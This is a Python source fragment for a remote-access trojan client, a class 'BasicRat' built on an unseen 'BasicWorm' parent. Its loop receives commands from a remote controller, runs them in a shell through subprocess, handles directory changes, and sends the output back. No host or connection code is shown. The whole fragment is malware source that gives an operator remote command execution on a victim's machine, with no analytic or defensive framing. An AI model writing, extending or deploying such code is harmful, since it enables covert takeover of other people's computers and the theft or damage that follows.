

import subprocess

class BasicRat(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "BasicRat_Client"
    
    def get_pwd(self):
        return str(os.getcwd())
    
    def show_pwd(self):
        return f"\n\n{os.getcwd()}"
    
    def ch_dir(self, name):
        try:
            os.chdir(name)
            self.send_msg(f"Change Directory Successfull. {self.get_pwd()}")
        except OSError as e:
            self.send_msg(f"[!!] Error [!!] {e}")
    
    def shell(self, cmd):
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if out.returncode == 0:
                return str(out.stdout) + self.show_pwd()
            else:
                return "ERROR: " + str(out.stderr) + self.show_pwd()
        except Exception as e:
            return f"[!!] ERROR [!!] : {e}"
    
    def exec_cmd(self, cmd):
        if cmd.startswith("cd "):
            self.ch_dir(cmd[3:])
        elif cmd == "pwd":
            self.send_msg(self.get_pwd())
        else:
            self.send_msg(self.shell(cmd))
        
    
    def RUN(self):
        self.check_conn()
        while True:
            cmd = self.recive_msg()
            if not cmd:
                return True
            self.exec_cmd(cmd)
        return True

